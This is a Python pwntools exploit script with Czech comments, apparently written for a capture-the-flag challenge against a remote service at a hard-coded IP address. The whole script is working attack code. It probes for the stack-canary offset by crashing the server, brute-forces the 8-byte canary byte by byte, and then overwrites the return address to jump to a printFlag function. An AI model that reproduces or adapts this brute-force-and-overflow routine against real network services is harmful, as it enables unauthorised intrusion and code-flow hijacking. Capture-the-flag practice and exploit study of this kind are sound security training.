from pwn import *
import sys

context.arch = 'amd64'
HOST = '16.16.203.34'
PORT = 80
BINARY_PATH = './main(2)'

elf = ELF(BINARY_PATH)


def find_offset():
    log.info("Zjišťuji přesný offset k canary (hledám místo pádu)...")
    for i in range(64, 120):
        p = remote(HOST, PORT, level='error')
        p.recvuntil(b"Only raw bytes are accepted.\n")

        p.send(b'A' * i)
        p.shutdown('send')

        try:
            response = p.recvall(timeout=2)
            if b"Nope, not the sacred 67-hash" not in response:
                offset = i - 1
                log.success(f"Crash detekován na délce {i}. Skutečný offset je {offset} bajtů.")
                p.close()
                return offset
        except EOFError:
            offset = i - 1
            log.success(f"Crash detekován na délce {i}. Skutečný offset je {offset} bajtů.")
            p.close()
            return offset

        p.close()

    log.error("Offset nenalezen. Něco je špatně se spojením.")
    sys.exit(1)


def bruteforce_canary(offset):
    # Alpine (musl libc) nemá úvodní \x00. Musíme začít s prázdným řetězcem.
    canary = b''
    log.info("Začínám brute-force canary (8 bajtů)...")

    for i in range(8):
        for guess in range(256):
            p = remote(HOST, PORT, level='error')
            p.recvuntil(b"Only raw bytes are accepted.\n")

            payload = b'A' * offset + canary + bytes([guess])
            p.send(payload)
            p.shutdown('send')

            try:
                response = p.recvall(timeout=2)
                # Pokud program nespadl a došel až k SHA-512 checku, trefili jsme bajt
                if b"Nope, not the sacred 67-hash" in response:
                    canary += bytes([guess])
                    log.success(f"Nalezen bajt [{i + 1}/8]: {hex(guess)}")
                    p.close()
                    break
            except EOFError:
                pass

            p.close()
        else:
            log.error(f"Nepodařilo se uhodnout bajt {i + 1}. Zkontroluj stabilitu serveru.")
            sys.exit(1)

    log.success(f"Kompletní canary nalezeno: {canary.hex()}")
    return canary


def exploit():
    # 1. Zjistíme, kolik bajtů je potřeba k dosažení canary
    offset = find_offset()

    # 2. Prolomíme kompletních 8 bajtů canary
    canary = bruteforce_canary(offset)

    log.info("Sestavuji a odesílám finální payload na Orba...")
    p = remote(HOST, PORT)
    p.recvuntil(b"Only raw bytes are accepted.\n")

    # Architektura payloadu
    payload = b'A' * offset  # 1. Padding k canary (72 bajtů)
    payload += canary  # 2. Naše nalezená canary (8 bajtů)
    payload += b'B' * 8  # 3. Přepsání uloženého RBP (8 bajtů)
    payload += p64(elf.symbols['printFlag'])  # 4. Skok na printFlag()

    p.send(payload)
    p.shutdown('send')

    # Odchycení vlajky
    log.success("Výsledek:")
    output = p.recvall(timeout=3).decode(errors='ignore')
    print(output)

    p.close()


if __name__ == '__main__':
    exploit()